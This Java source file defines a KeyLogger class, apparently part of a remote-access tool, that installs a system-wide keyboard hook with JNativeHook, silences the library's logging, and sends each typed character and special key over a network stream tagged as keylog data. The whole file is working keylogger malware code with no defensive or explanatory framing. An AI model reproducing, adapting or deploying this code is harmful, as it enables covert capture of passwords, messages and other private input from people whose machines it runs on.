package me.sebsb;

import java.io.PrintWriter;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import me.sebsb.utils.MessageType;
import me.sebsb.utils.NetUtils;

public class KeyLogger implements NativeKeyListener {

	private final PrintWriter pw;
	
	public KeyLogger(PrintWriter pw) throws NativeHookException {
		GlobalScreen.registerNativeHook();
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		GlobalScreen.addNativeKeyListener(this);
		this.pw = pw;
	}
	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		String text = NativeKeyEvent.getKeyText(arg0.getKeyCode());
		boolean changed = false;
		if (text.equals("Backspace")) {
			text = "Back";
			changed = true;
		}
		String chars = "abcdefghijklmnopqrstuvwxyz1234567890";
		boolean contains = false;
		try {
			for (char c : chars.toCharArray()) {
				if ((c + "").equals( (arg0.getKeyChar() + "").toLowerCase())) {
					contains = true;
				}
			}
			if (!contains) {
				changed = true;
			}
		} catch (Exception e) {
			changed = true;
		}
		if (text.equals("Space") || text.equals("Shift")) {
			changed = true;
		}
		
		if (changed) {
			NetUtils.sendMessage(text, MessageType.KEYLOG, pw);
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		
		String text = arg0.getKeyChar() + "";
		if (!text.equals(" ")) {
			NetUtils.sendMessage(text, MessageType.KEYLOG, pw);
		}
	}

}
